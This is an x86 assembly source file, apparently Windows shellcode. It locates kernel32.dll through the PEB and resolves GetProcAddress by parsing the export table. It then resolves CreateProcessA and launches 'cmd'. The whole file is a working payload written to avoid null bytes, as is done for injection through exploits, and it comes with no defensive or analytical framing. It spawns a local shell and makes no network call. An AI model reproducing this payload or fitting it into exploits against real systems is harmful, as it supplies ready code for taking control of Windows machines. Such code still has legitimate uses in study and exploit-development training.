global _start

section .text
_start:
	xor ecx, ecx					; zero out ecx
	mul ecx							; eax * ecx
	mov eax, [fs:ecx + 0x030]		; PEB loaded in eax
	mov eax, [eax + 0x00c]			; LDR loaded in eax
	mov esi, [eax + 0x014]			; InMemoryOrderModuleList loaded in esi
	lodsd							; .exe address loaded in eax (1st)	
	xchg	 esi, eax					
	lodsd							; ntdll.dll address loaded in eax (2nd)
	mov ebx, [eax + 0x10]			; kernel32.dll address loaded in ebx (3rd)

									; EBX = kernel32.dll base address
getAddressofName:
	mov edx, [ebx + 0x3c]    		; PEheader offset in ebx
    add edx, ebx            		; PEheader offset + base address
	mov edx, [edx + 0x78]   		; export directory offset in ebx
    add edx, ebx      				; export directory offset + base address
    mov esi, [edx + 0x20]   		; AddressOfNames offset in ebx
    add esi, ebx            		; AddressOfNames offset + base address
	xor ecx, ecx            		; zero out ECX so we can use it as a counter

getProcAddress:
	lodsd							; load AddressOfNames in eax
	inc ecx							; idx++
	add eax, ebx					; eax + base address
	cmp dword [eax], 0x50746547		; GetP
	jnz getProcAddress
	cmp dword [eax+0x4], 0x41636F72	; rocA
	jnz getProcAddress
	cmp dword [eax+0x8], 0x65726464	; ddre
	jnz getProcAddress					

getProcAddressAddr:
	mov esi, [edx +0x24]			; AddressOfNameOrdinals offset
	add esi, ebx					; offset + base address
	mov cx, [esi + ecx * 2]     	; array is made of 2-bytes idx
	dec ecx							; idx-- to fix previous inc
	mov esi, [edx + 0x1c]           ; AddressOfFunctions offset
	add esi, ebx					; offset + base address
	mov edx, [esi + ecx * 4]        ; array is made of 4 byte idx
	add edx, ebx					; offset + base address

getCreateProcessA:
	; GetProcAddress(HMODULE hModule, LPCSTR lpProcName)
	xor ecx, ecx                   	; zeroing ecx
	push 0x61614173	               	; aAaa
	sub word [esp + 0x2], 0x6161   	; sAaa - aa
	push 0x7365636f            		; oces
	push 0x72506574            		; tePr
	push 0x61657243            		; Crea
	push esp               			; push the pointer to string
	push ebx 						; kernel32 base address
	call edx                  		; call GetProcAddress

zero_memory:
    xor ecx, ecx                	; zero out ecx
	mov cl, 0xff               		; loop 255 times (0xff)
	xor edi, edi           			; zero out edi

zero_loop:
   	push edi                    	; place 0x00000000 on stack 255 times 
    loop zero_loop              			

getShell:
	push 0x617a6d63					; cmza
	sub word [esp + 0x2], 0x6116	; cmza -0x6116
	mov ecx, esp
	push ecx                   		; lpProcessInformation
    push ecx           				; lpStartupInfo
	xor edx, edx                	; zero out edx
	push edx          				; lpCurrentDirectory (NULL = same)
    push edx						; lpEnvironment
    push edx						; dwCreationFlags
    push edx						; bInheritHandles
    push edx						; lpThreadAttributes
    push edx						; lpProcessAttributes
    push ecx           				; 'cmd'
    push edx						; lpApplicationName
    call eax       					; spawn shell